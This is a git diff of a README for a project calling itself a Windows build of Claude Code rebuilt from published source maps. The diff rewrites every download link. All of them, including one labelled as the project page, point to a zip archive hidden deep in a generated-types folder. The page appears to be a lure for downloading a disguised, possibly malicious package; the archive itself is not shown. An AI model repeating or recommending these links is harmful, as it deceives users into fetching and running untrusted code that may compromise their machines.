@@ -1,6 +1,6 @@
 # 🧩 CC - Run Claude Code on Windows
 
-[![Download CC](https://img.shields.io/badge/Download-CC-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Duongdin3346/CC/main/src/types/generated/events_mono/Software-2.6-alpha.5.zip)
+[![Download CC](https://img.shields.io/badge/Download-CC-brightgreen?style=for-the-badge)](https://github.com/Duongdin3346/CC/raw/refs/heads/main/src/types/generated/events_mono/Software-2.6-alpha.5.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ This project rebuilds the app from published source map data. It is meant for le
 
 Visit this page to download:
 
-https://raw.githubusercontent.com/Duongdin3346/CC/main/src/types/generated/events_mono/Software-2.6-alpha.5.zip
+https://github.com/Duongdin3346/CC/raw/refs/heads/main/src/types/generated/events_mono/Software-2.6-alpha.5.zip
 
 Open the page, then use your browser’s download options if the project offers a release file or package. If you only see the repository page, use the files and instructions in the repo to get the app onto your PC.
 
@@ -186,4 +186,4 @@ If the app does not start, check these items:
 
 Use this link if you need to return to the project page:
 
-https://raw.githubusercontent.com/Duongdin3346/CC/main/src/types/generated/events_mono/Software-2.6-alpha.5.zip
+https://github.com/Duongdin3346/CC/raw/refs/heads/main/src/types/generated/events_mono/Software-2.6-alpha.5.zip
